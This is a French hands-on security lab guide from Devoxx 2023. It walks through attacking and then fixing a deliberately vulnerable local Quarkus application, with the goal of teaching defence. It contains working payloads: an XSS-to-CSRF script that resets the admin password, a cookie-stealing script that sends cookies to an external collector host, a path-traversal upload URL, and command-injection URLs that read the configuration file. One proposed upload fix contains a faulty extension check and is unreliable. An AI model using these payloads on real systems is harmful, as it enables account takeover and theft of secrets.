# Devoxx 2023
_HOL : Hacker son application JAVA pour mieux la sécuriser ensuite_

# Pré-requis
- Avoir JAVA 17 installé sur votre machine : https://jdk.java.net/archive/ ou https://adoptium.net/temurin/releases/
- Avoir Maven installé sur votre machine : https://maven.apache.org/download.cgi, puis https://maven.apache.org/install.html
- Importer le projet JAVA dans votre IDE préféré
- Lancer Quarkus : https://quarkus.io/guides/getting-started#running-the-application
- Puis mettez-vous directement en mode Hibernate "update", en décommentant la ligne 19 du fichier de configuration src/main/resources/application.properties et en commentant la ligne 18

````
#quarkus.hibernate-orm.database.generation=drop-and-create
quarkus.hibernate-orm.database.generation=update
````

# Cas 01 : Réinitialisation de mot de passe par envoi d'un lien

- Rendez-vous sur la page principale de cette application Java (sous Firefox, car Chrome n'aime pas http non sécurisé) : http://localhost:8081
- Il existe un compte administrateur créé automatiquement, vous ne le connaissez pas, mais vous allez devoir tenter de le découvrir.
- Vous allez maintenant créer un compte, via le bouton associé, le compte est automatiquement créé (on n'envoie pas de mail de confirmation ici pour simplification, mais simplement un mail de bienvenue que vous trouverez dans la log console de l'application)

## Description du cas fonctionnel

- Vous allez utiliser la fonction "J'ai oublié mon mot de passe", qui va vous demander votre email, puis va vous envoyer un email avec un lien spécifique.
- Ici, nous utilisons un mock pour le mail, donc le contenu du mail va apparaitre dans votre console (vous pouvez le copier/coller dans un fichier html puis l'ouvrir avec votre navigateur)
- Lancer la réinitialisation du mot de passe par un nouveau
- Vérifiez que le nouveau mot de passe fonctionne bien (et que l'ancien ne fonctionne plus)

## Phase d'attaque

- Vous souhaitez prendre le contrôle de l'administrateur de l'application
- Vous devez deja trouver son email
- Puis vous allez utiliser la fonction d'oubli de mot de passe pour réinitialiser le mot de passe de l'administrateur avec un mot de passe de votre choix
    - Attention vous devez vous placer dans la peau d'un attaquant donc considérer que vous n'avez pas accès à la log console du serveur
- Vous allez enfin vous connecter en tant qu'administrateur

### Solution

- Vous créez un compte d'attaque avec un mail qui existe (car il faut pouvoir recevoir le mail avec le lien)
- Vous constatez que le mail de bienvenu provient de info@devoxx.com. Vous cherchez donc un autre compte qui pourrait être admin
    - Quand vous vous inscrivez, vous constatez que si vous vous inscrivez 2 fois, il vous dit que le mail est deja pris, cela va vous permettre de tester les comptes pour trouver l'admin => admin@devoxx.com
- Vous utilisez la fonction d'oubli de mot pour votre compte d'attaque => vous récupérez le lien correspondant
- Vous modifiez le lien en mettant l'adresse email de l'administrateur puis vous allez sur le lien
    - Attention vous devez effectuer la manipulation de modification du lien rapidement, car les demandes de changements de mots de passes expirent toutes les 5 minutes (Cf UserScheduleService#deleteReinitPasswordRequest)
- Vous remplissez le mot de passe que vous voulez, puis vous lancez la réinitialisation
- Vous pouvez ensuite vous connecter en tant qu'administrateur

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !
- Les services REST de gestion des utilisateurs se trouvent dans la classe UsersResource, les process dans la classe UserService
- _OPTIONNEL_ : Mettez en évidence le problème par un nouveau test ou une modification du test UsersResourceTest#should_return_200_when_reinit_password_request_process
- _OPTIONNEL_ : Ajouter un logger de sécurité qui met en évidence :
    - Une action sensible (légitime) => [SECURITY OK]
    - Une action malveillante => [SECURITY WARN]
- Corrigez le problème

### Solution

- Nous pouvons modifier le test UsersResourceTest#should_return_200_when_reinit_password_request_process pour ajouter le comportement de l'attaquant, et ainsi vérifier que cette attaque est actuellement possible => le test doit être en erreur
- Il faut ensuite corriger le code, Cf UsersResource#reinitPassword, la ligne devient :
-
```
  if (reinitPasswordRequest == null || !reinitPasswordRequest.getId().equals(requestUuid) || !reinitPasswordRequest.email.equalsIgnoreCase(email)) {
```

- Et là le test passe au vert
  - Autre solution, on ne passe plus le paramètre email dans la requête, et on le récupère directement du ReinitPasswordRequest
- Pour les logs on peut ajouter un handler de security par exemple dans le fichier configuration.properties, avec une classe de log dédiée UserServiceSecurityLogger

```  
  #log

  quarkus.log.handler.console."SECURITY_LOGGING".format=%d{yyyy-MM-dd HH:mm:ss,SSS} SECURITY %-5p [%c{3.}] (%t) %s%e%n
  quarkus.log.category."org.tcollignon.user.service.UserServiceSecurityLogger".handlers=SECURITY_LOGGING
```

- Puis ajout de ligne de log du style :  LOG.warn("Anormal action was made for user " + user.email);

# Cas 02 : Modification de mot de passe dans sa page de profil

- Rendez-vous sur la page principale de cette application, puis identifiez-vous avec votre compte personnel
- Vous devriez ensuite avoir une page qui vous permet de modifier vos données personnelles : pseudo, mot de passe et description
- Faites un essai, vous pouvez normalement modifier ces informations sans problème (le mot de passe doit être de 6 caractères minimum s'il est renseigné)

## Description du cas fonctionnel

- Vous constatez qu'il est possible de changer de mot de passe sans devoir saisir la valeur de l'ancien mot de passe.
- Vous allez utiliser cette fonction pour tenter une nouvelle fois de modifier le mot de passe d'un autre compte => celui de l'admin
- Vous allez utiliser une faille XSS de l'application afin de pouvoir utiliser une faille CSRF

## Phase d'attaque

- Vous souhaitez prendre à nouveau le contrôle de l'administrateur de l'application, vous connaissez maintenant son email : admin@devoxx.com
- Vous devez tout d'abord chercher la faille XSS, dans cet exercice vous devez alterner entre la position d'attaquant et la position de l'admin de l'autre, c'est un genre de jeu de rôle
  - Indice : l'administrateur possède une page lui permettant de voir la liste de tous les utilisateurs. Vous pouvez la tester en vous mettant dans le rôle de l'admin, en vous connectant, puis en utilisant le bouton "Voir les utilisateurs"
- Une fois la faille XSS trouvée, exploitez-la pour modifier le mot de passe de l'admin via une faille CSRF
  - Pour alterner entre utilisateur qui tente de hacker, et administrateur qui va consulter sa page "Voir les utilisateurs", vous pouvez utiliser une session de navigation privée avec l'admin et la session standard avec l'utilisateur
- Vous allez enfin vous connecter en tant qu'administrateur avec le nouveau mot de passe

### Solution

- Vous créez un compte d'attaque
- Vous vous logguez
- Vous lancez la modification de votre mot de passe afin de voir quelle requête est lancée => c'est cette requête qu'il faut faire lancer par l'admin via une attaque CSRF en utilisant son cookie
- Afin de pouvoir faire exécuter la requête par l'admin, vous allez modifier votre description pour inclure du code javascript (et ainsi exploiter une faille XSS) qui va lancer cette requête via fetch
- Lorsque l'admin ira voir la page "les utilisateurs de l'application devoxx", la requête javascript sera exécutée, en utilisant son cookie, et son mot de passe sera changé automatiquement
- La description peut-être modifiée comme ceci :

```
<script>
fetch("http://localhost:8081/users/myprofile", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "*/*",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Content-Type": "application/json",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-GPC": "1"
    },
    "referrer": "http://localhost:8081/",
    "body": "{\"nickname\":\"admin\",\"firstName\":\"\",\"name\":\"\",\"email\":\"admin@devoxx.com\",\"desc\":\"\",\"password\":\"devoxxnew\",\"acceptNewsletter\":true}",
    "method": "POST",
    "mode": "cors"
});
</script>
```

- Puis vous jouer le rôle de l'admin qui se connecte et qui se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
- Son mot de passe vient d'être modifié
- Vous pouvez ensuite vous connecter en tant qu'administrateur avec ce nouveau mot de passe

- Bonus : Si vous souhaitez voler le cookie de l'admin voici une payload exemple que vous pouvez essayer dans le champ description

```
<script>var i=new Image;i.src="http://jzm0oi5fnwqhv62vx06zgbiay14wsygn.oastify.com?cookie="+document.cookie;</script>
```

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !

### Solution

- Le mieux ici pour éviter les failles CSRF c'est déjà d'éviter les failles XSS, car CSRF peut être protégée via https://quarkus.io/guides/security-csrf-prevention, mais tant qu'il y a une XSS possible ça ne protegera pas des CSRF.
- Il faut donc trouver le moyen d'enlever la faille XSS par plusieurs moyens : 
  - Ne pas utiliser le  {user.desc.raw} dans le template quarkus, mais plutôt {user.desc} qui n'utilisera que le texte et non le code html, c'est moins permissif et donc plus sécurisé
  - Si l'on utilise LIT-HTML par exemple pour afficher cela il est trés sécurisé contre les failles XSS par défaut, donc il trés difficile de lui faire exécuter du code javascript, c'est encore mieux qu'utiliser un template Quarkus
  - Si l'on ne veut pas utiliser les 2 précédentes alors il faut "nettoyer" l'input client avant de l'afficher à l'écran, par exemple via la librairie https://owasp.org/www-project-java-html-sanitizer/

```
<dependency>
    <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
    <artifactId>owasp-java-html-sanitizer</artifactId>
    <version>20180219.1</version>
</dependency>


@GET
@Produces(MediaType.TEXT_HTML)
@Consumes(MediaType.TEXT_HTML)
@Path("listUsers")
@RolesAllowed({"admin", "config"})
public TemplateInstance usersTemplate() {
    List<User> usersList = User.findAll().list();
    PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
    for (User user : usersList) {
        user.desc = policy.sanitize(user.desc);
    }
    return users.data("users", usersList);
}
```

# Cas 03 : Upload image de profil

On va s'intéresser ici à la fonctionnalité qui permet d'ajouter/modifier une image de profil.

## Description du cas fonctionnel

- Rendez-vous sur votre page de profil, puis essayez d'ajouter une image de profil.
- Vérifiez que tout fonctionne bien.
    - Note : il faut recharger quarkus dev pour que l'image s'affiche car on la copie dans le repertoire public image et il faut donc que la partie front soit mise à jour (on émule un genre de serveur web)

## Phase d'attaque

- Vous savez que le backend tourne sur Java / Quarkus (grâce au logo de la page d'accueil qui porte le nom quarkus.png)
- Vous allez donc essayer de remplacer le fichier de configuration de quarkus (présent dans l'arborescence src/main/resources), afin d'y placer le vôtre
- Au prochain redémarrage de l'application, c'est votre fichier qui sera chargé, et c'est la catastrophe, vous pouvez introduire ce que vous voulez

### Solution

- Vous analysez la requête qui part lorsque vous uploadez votre image de profil
- Vous vous rendez compte qu'il n'y a pas de contrôle sur le type de fichier
- Vous renvoyez donc la requête avec un fichier properties et un nom qui va remplacer l'existant : http://localhost:8081/users/uploadImage?name=..%2Fsrc%2Fmain%2Fresources%2Fapplication.properties
    - Il faut sur plusieurs essais pour comprendre que le fichier est d'abord écrit dans un répertoire tmp, avant d'être copié dans public/img, mais grâce aux erreurs qui remontent "Error from server" vous pouvez y parvenir

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !
- _OPTIONNEL_ : Ajouter un logger de sécurité
- Corrigez le problème


### Solution

- Afficher une indication sur la technologie du backend n'est pas une bonne idée, il ne faut laisser aucune informations sensibles visibles
- Le code qui pose problème se trouve dans UsersResources#uploadImage
- En effet, on peut constater plusieurs sources de failles de sécurité :
    - On passe le nom du fichier en paramètre du service : ce nom ne sert à rien au code backend, il ne faut pas le passer pour éviter justement une faille à cause de lui
    - On ne contrôle pas coté backend le type de fichier, ici c'est une image il faut se restreindre à cela, et jeter tout le reste
    - On fait une copie du fichier dans le répertoire de l'application, c'est très dangereux, il faut considérer ce repertoire comme readonly depuis l'extérieur. Il faut écrire le fichier dans un espace tmp du serveur, ou bien directement sur le repertoire image publique cible
- Une proposition de code est donc :

``` 
@POST
@Path("uploadImage")
@Consumes(MediaType.TEXT_PLAIN)
public Response uploadImage(@Context SecurityContext securityContext, String image) throws IOException {
    User userAuth = User.findByEmail(securityContext.getUserPrincipal().getName());
    //Write file in public image folder
    byte[] decodedBytes = Base64.getDecoder().decode(image.split(BASE_64_COMMA)[1]);
    String mimeType = image.split(BASE_64_COMMA)[0].replace(DATA, "");
    String extension = mimeType.split("/")[1];
    if (!extension.equalsIgnoreCase("png") || !extension.equalsIgnoreCase("jpg")) {
        userServiceSecurityLogger.logUploadFileNotImage(extension);
        return Response.status(403).build();
    }
    String imgPublicDir = "src/main/webui/public/img/profil";
    String imageFinalName = userAuth.nickname + "_" + System.currentTimeMillis() + "." + extension;
    Files.write(Paths.get(imgPublicDir + "/" + imageFinalName), decodedBytes);

    //Then, we update user
    User userModified = service.updateProfilImage(userAuth, imageFinalName);

    return Response.status(200).entity(UserFrontMapper.map(userModified)).build();
}
``` 

- Un bonus serait également de contrôle la taille de l'image pour éviter les attaque par déni de service : quarkus.http.limits.max-body-size

# Cas 04 : Affichage d'un fichier sensible

Le but ici va être d'afficher le fichier de configuration de l'application Quarkus que vous avez pu mettre à jour juste avant.
En effet, avec le contenu, vous allez pouvoir obtenir un accès direct à la base de données par exemple.

## Description du cas fonctionnel

- Vous connaissez désormais le mot de passe d'un compte admin, vous pouvez donc exécuter des services de niveau admin.
- Vous allez utiliser cela pour afficher le contenu du fichier de configuration de l'application.
- Pour cela il vous faut utiliser une faille SSRF, afin de faire exécuter au serveur une commande permettant de lire le fichier en question.

## Phase d'attaque

- Vous devez commencer par trouver un service WEB d'administration qui permet de monitorer le process de l'application
- En détournant ce process vous devez arriver à faire exécuter une commande au serveur permettant d'afficher le contenu du fichier de configuration de l'application
- Le service doit enfin vous retourner le contenu de ce fichier

### Solution

- Vous vous connectez en tant que admin@devoxx.com
- Vous testez la fameuse URL "/admin" et vous vous rendez compte quelle renvoi la liste des commandes java du serveur
- Vous voyez qu'en fin de page on vous indique comment monitorer le process de votre choix
- Vous testez donc l'URL "/admin/procPerf?pid=XXX" en choisissant un pid dans la liste proposée, et vous avez accès à la trace jcmd de PerfCounter.print
- Vous constatez donc ici qu'on passe un paramètre et que celui-ci est concatené à la commande executée par le serveur
- Vous aller donc vous servir de ce point d'injection pour lancer la commande qui vous interesse
- Il faut donc que vous passiez la bonne commande avec un PID qui existe pour trouver le fichier de configuration, vous devez donc savoir dans quel dossier vous êtes actuellement (en n'oubliant pas les url encode) : http://localhost:8081/admin/procPerf?pid=XXX%26%26cd%26%26REM
    - Vous constatez que vous vous trouvez vraisemblablement dans le dossier courant du serveur
    - Vous exécutez donc la commande permettant d'afficher le fichier de configuration dans son répertoire classique (en n'oubliant pas les url encode) : http://localhost:8081/admin/procPerf?pid=XXX%26%26type%20src%5Cmain%5Cresources%5Capplication.properties%26%26REM
    - et vous récupérez le contenu du fameux fichier !

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !